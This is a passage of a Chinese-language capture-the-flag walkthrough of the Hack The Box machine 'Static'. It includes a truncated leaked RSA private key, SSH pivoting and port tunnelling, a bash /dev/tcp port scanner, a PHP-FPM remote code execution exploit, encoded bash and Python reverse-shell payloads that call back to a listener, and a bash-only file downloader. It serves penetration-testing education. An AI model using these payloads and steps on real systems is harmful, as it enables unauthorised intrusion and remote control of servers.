KEY-----<br/>MIIEowIBAAKCAQEA0pNa5qwGZ+DKsS60GPhNfCqZti7z1xPzxOTXwtwO9uYzZpq/<br/>nrhzgJq0nQNVRUbaiZ+H6gR1OreDyjr9YorV2kJqccscBPZ59RAhttaQsBqHkGjJ<br/>&lt;SNIP&gt;<br/>sjZU9eeOecWbg+B6RWQTNcxo/cRjMpxd5hRaANYhcFXGuxcg1N3nszhWDpHIpGr+<br/>s5Mwc3oopgv6gMmetHMr0mcGz6OR9KsH8FvW1y+DYY3tUdgx0gau<br/>-----END RSA PRIVATE KEY-----" &gt; id_rsa<br/><br/>┌──(root💀kali)-[~/htb/static]<br/>└─# chmod 600 id_rsa</span></pre><p id="a311" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我尝试使用SSH密钥连接到主静态箱:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="ddfc" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/static]<br/>└─# ssh -i id_rsa_www-data www-data@10.10.10.246<br/>www-data@10.10.10.246's password: <br/>Permission denied, please try again.<br/>www-data@10.10.10.246's password: <br/>Permission denied, please try again.<br/>www-data@10.10.10.246's password: <br/>www-data@10.10.10.246: Permission denied (publickey,password).</span></pre><h1 id="29f7" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">用户SSH访问</h1><p id="fc40" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">这不起作用，但有趣的是，我们可以使用www-data的SSH密钥连接到172 IP的web服务器:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="0cd9" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/static]<br/>└─# ssh -i id_rsa www-data@172.20.0.10 <br/>Last login: Wed Nov  3 21:38:58 2021 from 10.10.15.41<br/>www-data@web:~$</span></pre><p id="d697" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们还可以使用它来连接到主静态箱，但是在我们从初始扫描中看到的端口2222上也运行SSH:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="40e3" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/static]<br/>└─# ssh -i id_rsa www-data@10.10.10.246 -p 2222<br/>Last login: Mon Jun 14 08:00:30 2021 from 10.10.14.4<br/>www-data@web:~$</span></pre><p id="e53e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了简单起见，我退出了web VPN，继续使用SSH直接连接到机器。在我查看网络连接之前，没有什么明显的变化:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="0b75" class="mx km iq mt b gy my mz l na nb">www-data@web:/$ ifconfig eth1<br/>eth1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500<br/>        inet 192.168.254.2  netmask 255.255.255.0  broadcast 192.168.254.255<br/>        ether 02:42:c0:a8:fe:02  txqueuelen 0  (Ethernet)<br/>        RX packets 392  bytes 361065 (361.0 KB)<br/>        RX errors 0  dropped 0  overruns 0  frame 0<br/>        TX packets 498  bytes 36481 (36.4 KB)<br/>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span></pre><p id="bef9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们有第二个到不同网络的连接，机器上没有nmap。我做了一个简单的循环来扫描网络:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="9779" class="mx km iq mt b gy my mz l na nb">www-data@web:/$ for i in {1..254} ;do (ping -c 1 192.168.254.$i | grep "bytes from" &amp;) ;done</span><span id="0884" class="mx km iq mt b gy nw mz l na nb">64 bytes from 192.168.254.1: icmp_seq=1 ttl=64 time=0.097 ms<br/>64 bytes from 192.168.254.2: icmp_seq=1 ttl=64 time=0.048 ms<br/>64 bytes from 192.168.254.3: icmp_seq=1 ttl=64 time=0.088 ms</span></pre><p id="c7a8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们得到了两个IP以及我们自己的回复。让我们使用<a class="ae nl" href="https://coderwall.com/p/udnrjq/port-scanning-with-bash-without-sudo-nmap-or-nc" rel="noopener ugc nofollow" target="_blank">这个</a>有用的bashfu扫描它们的开放端口:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="ad5b" class="mx km iq mt b gy my mz l na nb">www-data@web:/$ nmap2 () {<br/>&gt; [[ $# -ne 1 ]] &amp;&amp; echo "Please provide server name" &amp;&amp; return 1<br/>&gt; <br/>&gt; for i in {1..9000} ; do<br/>&gt;   SERVER="$1"<br/>&gt;   PORT=$i<br/>&gt;   (echo  &gt; /dev/tcp/$SERVER/$PORT) &gt;&amp; /dev/null &amp;&amp;<br/>&gt;    echo "Port $PORT seems to be open"<br/>&gt; done<br/>&gt; }<br/><br/>www-data@web:/$ nmap2 192.168.254.1<br/>Port 22 seems to be open<br/>Port 2222 seems to be open<br/><br/>www-data@web:/$ nmap2 192.168.254.2<br/>Port 22 seems to be open<br/>Port 80 seems to be open<br/><br/>www-data@web:/$ nmap2 192.168.254.3<br/>Port 80 seems to be open</span></pre><p id="917a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">回头看看我们之前找到的IT支持门户，我注意到192.168.254.3作为一个名为pki的服务器列在那里。从扫描中我们可以看到端口80是打开的，为了达到这个目的，我们需要通过这个SSH连接从Kali建立一个端口隧道。我们之前已经这样做过很多次了，比如在<a class="ae nl" href="https://pencer.io/ctf/ctf-thm-game-zone" rel="noopener ugc nofollow" target="_blank"> GameZone </a>上，我们简单地转发端口80:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="937e" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/static]<br/>└─# ssh -L 80:192.168.254.3:80 www-data@10.10.10.246 -p2222 -i id_rsa<br/>www-data@web:~$</span></pre><h1 id="b3b2" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">PKI服务器</h1><p id="fa02" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">在这里，我们已经说过，Kali上任何到端口80的流量都通过SSH连接转发到端口2222上的10.10.10.246，并将其传递到端口80上的192.168.254.3。这里有一篇很好的文章<a class="ae nl" href="https://www.ssh.com/academy/ssh/tunneling/example" rel="noopener ugc nofollow" target="_blank">对此做了更多的解释。</a></p><p id="227a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们可以访问pki服务器了:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="b266" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/static]<br/>└─# curl -i localhost<br/>HTTP/1.1 200 OK<br/>Server: nginx/1.14.0 (Ubuntu)<br/>Date: Wed, 03 Nov 2021 22:27:24 GMT<br/>Content-Type: text/html; charset=UTF-8<br/>Transfer-Encoding: chunked<br/>Connection: keep-alive<br/>X-Powered-By: PHP-FPM/7.1<br/><br/>batch mode: /usr/bin/ersatool create|print|revoke CN</span></pre><p id="e3d7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">好吧，我承认我期待更多！搜索PHP-FPM漏洞会发现Github上有很多选项，比如<a class="ae nl" href="https://github.com/AleWong/PHP-FPM-Remote-Code-Execution-Vulnerability-CVE-2019-11043-" rel="noopener ugc nofollow" target="_blank">这个</a>一个、<a class="ae nl" href="https://github.com/neex/phuip-fpizdam" rel="noopener ugc nofollow" target="_blank">这个</a>一个或者<a class="ae nl" href="https://github.com/theMiddleBlue/CVE-2019-11043" rel="noopener ugc nofollow" target="_blank">这个</a>一个。我选择了最简单的，一个简单的Python脚本:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi nx"><img src="../Images/4244dae8fd76e052fe0699c1b4476a48.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*03jt_eBwtzOYS3IAseZYkQ.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">PHP-FPM漏洞</figcaption></figure><h1 id="8900" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">RCE利用</h1><p id="03f0" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">我们可以通过隧道在服务器上运行它:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="ec39" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/static]<br/>└─# python3 exploit.py --url http://localhost/index.php<br/>[*] QSL candidate: 1754, 1759, 1764<br/>[*] Target seems vulnerable (QSL:1754/HVL:224): PHPSESSID=d129421703528e986f0c21155dd4b765; path=/<br/>[*] RCE successfully exploited!<br/><br/>    You should be able to run commands using:<br/>    curl http://localhost/index.php?a=bin/ls+/</span></pre><p id="1c5c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">看起来不错，我们试试吧:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="754a" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/static]<br/>└─# curl -s http://localhost/index.php?a=/usr/bin/id<br/>[03-Nov-2021 22:41:23 UTC] PHP Warning:  Unknown: Unable to load dynamic library 'uid=33(www-data) gid=33(www-data) groups=33(www-data)<br/>' - uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></pre><p id="4bc2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是可行的，所以我们可以通过隧道远程执行代码到服务器。但是我们不能在pki服务器上执行反向shell，并在Kali上将其捕获回来。相反，我们需要在中间的web服务器上，所以我们只需要复制netcat的静态二进制文件，因为它目前不在机器上。</p><p id="b4ae" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Github上有很多选项，我用的是<a class="ae nl" href="https://github.com/H74N/netcat-binaries/blob/master/nc" rel="noopener ugc nofollow" target="_blank">这个</a>的:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi ny"><img src="../Images/fa02d0473b184a54ed244582e51e6a54.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HGJPmF8eeL2c5JZwbuB2Cw.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">下载nc的静态版本</figcaption></figure><p id="f149" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们还需要带上curl over，我用的是<a class="ae nl" href="https://github.com/moparisthebest/static-curl" rel="noopener ugc nofollow" target="_blank">这个</a>一个:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi nz"><img src="../Images/b557cb32dc527423eb1ae408db569303.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*i55I7Wi2ReuYu47jb5CWhw.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">下载curl的静态版本</figcaption></figure><p id="0cfc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们需要将它们复制到web框中:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="237c" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/static]<br/>└─# scp -P 2222 -i id_rsa nc  www-data@10.10.10.246:/tmp<br/>nc                               100%  762KB   1.8MB/s   00:00<br/>┌──(root💀kali)-[~/htb/static]<br/>└─# scp -P 2222 -i id_rsa curl-amd64  www-data@10.10.10.246:/tmp<br/>curl-amd64                       100% 3371KB   2.1MB/s   00:01</span></pre><h1 id="c677" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">反向外壳有效负载</h1><p id="0037" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">最后，我们需要创建我们的有效载荷。我们可以从<a class="ae nl" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" rel="noopener ugc nofollow" target="_blank">这里</a>取一个pentestmonkey反向shell。然后我们用base64和URL编码它:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="25be" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/static]<br/>└─# echo -n "/bin/bash -c '/bin/bash -i &gt;&amp; /dev/tcp/192.168.254.2/1337 0&gt;&amp;1'" | base64<br/>L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQuMi8xMzM3IDA+JjEn</span></pre><p id="03b1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将base64编码字符串放入echo，解码，然后传递给bash，以便能够在机器上安全地执行。URL也对其进行编码，让我们使用Python来实现:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="d97d" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/static]<br/>└─# python3 -c "import urllib.parse; print(urllib.parse.quote('/bin/bash -c \'echo -n L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQuMi8xMzM3IDA+JjEn | base64 -d | bash\''))" <br/>/bin/bash%20-c%20%27echo%20-n%20L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQuMi8xMzM3IDA%2BJjEn%20%7C%20base64%20-d%20%7C%20bash%27</span></pre><p id="ade7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我们有了像以前一样使用a=参数的有效负载。所以我们最后的命令看起来像这样:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="6fc9" class="mx km iq mt b gy my mz l na nb">./curl-amd64 -s http://192.168.254.3/index.php?a=/bin/bash%20-c%20%27echo%20-n%20L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQuMi8xMzM3IDA%2BJjEn%20%7C%20base64%20-d%20%7C%20bash%27</span></pre><p id="e79b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在web box上执行之前，我们需要打开第二个SSH会话，nc等待捕获shell:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="319e" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/static]<br/>└─# ssh -i id_rsa www-data@10.10.10.246 -p 2222                                     <br/>Last login: Sat Nov  6 16:04:52 2021 from 10.10.15.41<br/><br/>www-data@web:~$ cd /tmp<br/>www-data@web:/tmp$ ./nc -nlvp 1337<br/>listening on [any] 1337 ...</span></pre><p id="76fe" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，将curl命令粘贴到我们在web box上打开的第一个SSH会话中:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="1708" class="mx km iq mt b gy my mz l na nb">www-data@web:/tmp$ ./curl-amd64 -s http://192.168.254.3/index.php?a=/bin/bash%20-c%20%27echo%20-n%20L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQuMi8xMzM3IDA%2BJjEn%20%7C%20base64%20-d%20%7C%20bash%27</span></pre><h1 id="fc46" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">PKI服务器反向外壳</h1><p id="2397" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">切换到我们的第二个SSH会话，看看我们有一个反向shell连接到192.168.254.2上的pki箱:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="7142" class="mx km iq mt b gy my mz l na nb">www-data@web:/tmp$ ./nc -nlvp 1337<br/>listening on [any] 1337 ...<br/>connect to [192.168.254.2] from (UNKNOWN) [192.168.254.3] 34382<br/>bash: cannot set terminal process group (11): Inappropriate ioctl for device<br/>bash: no job control in this shell<br/>www-data@pki:~/html$</span></pre><p id="7f07" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">相反，我们可以使用一个liner来创建我们的有效负载，并在一个程序中执行所有操作:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="9a18" class="mx km iq mt b gy my mz l na nb">www-data@web:/tmp$ python3 -c "import urllib.parse; import os; PAYLOAD=('./curl-amd64 -s http://192.168.254.3/index.php?a='); PAYLOAD+=(urllib.parse.quote('/bin/bash -c \'echo -n L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQuMi8xMzM3IDA+JjEn | base64 -d | bash\'')); os.system(PAYLOAD)"</span></pre><p id="3a6b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">另一个选择是使用<a class="ae nl" href="https://docs.python-requests.org/en/latest/user/quickstart/#make-a-request" rel="noopener ugc nofollow" target="_blank">请求</a>库的Python脚本:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="2233" class="mx km iq mt b gy my mz l na nb">#!/usr/bin/env python<br/>import requests<br/>payload = '/usr/bin/python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.254.2",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);\''<br/>requests.get("http://192.168.254.3/index.php?a="+payload)</span></pre><p id="0c9e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果您想这样做，那么将上面的Python放在一个名为script.py的文件中，并将其上传到box:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="6bc6" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/static]<br/>└─# scp -P 2222 -i id_rsa script.py www-data@10.10.10.246:/tmp<br/>script.py                        100%  353    16.4KB/s   00:00</span></pre><p id="602f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后在web box上执行它:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="36e2" class="mx km iq mt b gy my mz l na nb">www-data@web:/tmp$ chmod +x script.py<br/>www-data@web:/tmp$ ./script.py</span></pre><p id="1da9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">不管我们是通过哪种方式获得shell的，现在是时候看看这个新的pki盒子了。但是这里没有主文件夹，passwd文件显示只有root用户可以登录:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="7d93" class="mx km iq mt b gy my mz l na nb">www-data@pki:~/html$ cat /etc/passwd<br/>cat /etc/passwd<br/>root:x:0:0:root:/root:/bin/bash<br/>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br/>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br/>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br/>sync:x:4:65534:sync:/bin:/bin/sync<br/>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br/>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br/>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br/>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br/>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br/>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br/>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span></pre><h1 id="da45" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">代用醇</h1><p id="a977" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">早些时候，当访问pki盒上的端口80时，我们得到了以下响应:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="789b" class="mx km iq mt b gy my mz l na nb">batch mode: /usr/bin/ersatool create|print|revoke CN</span></pre><p id="de9e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">寻找二进制文件也能找到它的源代码:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="8ee0" class="mx km iq mt b gy my mz l na nb">www-data@pki:~/html$ find / -name ersa* 2&gt;/dev/null<br/>find / -name ersa* 2&gt;/dev/null<br/>/usr/src/ersatool.c<br/>/usr/bin/ersatool</span></pre><p id="4185" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我查看了替代工具的源代码，但是我不擅长C语言，也不能理解它。相反，我们可以复制。c文件到Kali，编译它，然后使用一个类似Ghidra的调试器来分析它是如何工作的。或者我们可以使用<a class="ae nl" href="https://github.com/DominicBreuker/pspy" rel="noopener ugc nofollow" target="_blank"> pspy64 </a>像我们在其他盒子上做的一样，例如<a class="ae nl" href="https://www.hackthebox.com/home/machines/profile/160" rel="noopener ugc nofollow" target="_blank">冰壶</a>和<a class="ae nl" href="https://www.hackthebox.com/home/machines/profile/165" rel="noopener ugc nofollow" target="_blank">老师</a>来查看运行过程。我要用pspy64，因为它很容易使用，所以让我们把它下载到Kali，然后复制到web服务器:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi oa"><img src="../Images/77c13c4414a22440961a1a41d9d41ba5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EgYWnG3BtcLmReDVKt2eMQ.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">下载pspy64并复制到服务器</figcaption></figure><p id="a7ac" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">对于web box上的文件，我们需要启动我们的web服务器，以便能够从pki box访问它:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="0799" class="mx km iq mt b gy my mz l na nb">www-data@web:/tmp$ python3 -m http.server<br/>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span></pre><h1 id="f808" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">Bash Wget替代</h1><p id="6cf4" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">现在我们需要把pspy64放到pki盒子里，这并不容易，因为它没有nc、wget、curl或其他有用的东西。搜索有很多关于如何使用echo、exec、sed和其他工具的例子，比如<a class="ae nl" href="https://www.shell-tips.com/bash/download-files-from-shell" rel="noopener ugc nofollow" target="_blank">这个</a>一个、<a class="ae nl" href="https://superuser.com/questions/40545/upgrading-and-installing-packages-through-the-cygwin-command-line/496572#496572" rel="noopener ugc nofollow" target="_blank">这个</a>一个或<a class="ae nl" href="https://unix.stackexchange.com/questions/83926/how-to-download-a-file-using-just-bash-and-nothing-else-no-curl-wget-perl-et" rel="noopener ugc nofollow" target="_blank">这个</a>一个。</p><p id="b1fa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">只需复制其中一个示例并粘贴到pki服务器上的shell中:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="e6f8" class="mx km iq mt b gy my mz l na nb">function _get() {<br/>    read proto server path &lt;&lt;&lt;$(echo ${1//// })<br/>    DOC=/${path// //}<br/>    HOST=${server//:*}<br/>    PORT=${server//*:}<br/>    [[ x"${HOST}" == x"${PORT}" ]] &amp;&amp; PORT=80<br/>    exec 3&lt;&gt;/dev/tcp/${HOST}/$PORT<br/>    echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" &gt;&amp;3<br/>    (while read line; do<br/>        [[ "$line" == $'\r' ]] &amp;&amp; break<br/>    done &amp;&amp; cat) &lt;&amp;3<br/>    exec 3&gt;&amp;-<br/>}</span></pre><p id="fed3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们可以使用这个函数:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="a140" class="mx km iq mt b gy my mz l na nb">www-data@pki:/tmp$ _get http://192.168.254.2:8000/pspy64 &gt; pspy64<br/>_get http://192.168.254.2:8000/pspy64 &gt; pspy64<br/><br/>www-data@pki:/tmp$ ls -lsa p*<br/>ls -lsa p*<br/>3008 -rw-r--r-- 1 www-data www-data 3078592 Nov  6 20:47 pspy64<br/><br/>www-data@pki:/tmp$ chmod +x pspy64</span></pre><h1 id="dd7b" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">Pspy64</h1><p id="70ee" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">我们复制了pspy64并使其可执行，现在我们运行它，让它监视我们正在做的事情:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi ob"><img src="../Images/4fae8a0edfaed3fb974ddf0e5db77c7d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*i9EFbVLsG_s2i9VYAo6EGw.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">在目标上运行pspy64</figcaption></figure><p id="55d1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当pspy64正在观察时，我们需要另一个到pki盒的会话，以便我们可以与替代工具交互。只需对base64和URL编码重复上述相同的过程，然后再次使用web box上的漏洞触发远程命令执行。我将端口1338用于第二个到pki盒的连接，因为第一个运行pspy64的是端口1337:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="66ee" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/static]<br/>└─# ssh -i id_rsa www-data@10.10.10.246 -p 2222<br/>Last login: Sat Nov  6 21:56:12 2021 from 10.10.15.41<br/><br/>www-data@web:~$ cd /tmp<br/>www-data@web:/tmp$ ./nc -nlvp 1338<br/>listening on [any] 1338 ...<br/>connect to [192.168.254.2] from (UNKNOWN) [192.168.254.3] 50620<br/>bash: cannot set terminal process group (16): Inappropriate ioctl for device<br/>bash: no job control in this shell<br/>www-data@pki:/tmp$</span></pre><p id="ee2b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们可以使用代用工具:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="b8fb" class="mx km iq mt b gy my mz l na nb">www-data@pki:/tmp$ ersatool<br/>ersatool<br/># create<br/>create-&gt;CN=a<br/>client<br/>dev tun9<br/>proto udp<br/>remote vpn.static.htb 1194<br/>resolv-retry infinite<br/>nobind<br/>user nobody<br/>group nogroup<br/>persist-key<br/>persist-tun<br/><br/>remote-cert-tls server<br/><br/>cipher AES-256-CBC<br/>#auth SHA256<br/>key-direction 1<br/>verb 3<br/>&lt;ca&gt;<br/>-----BEGIN 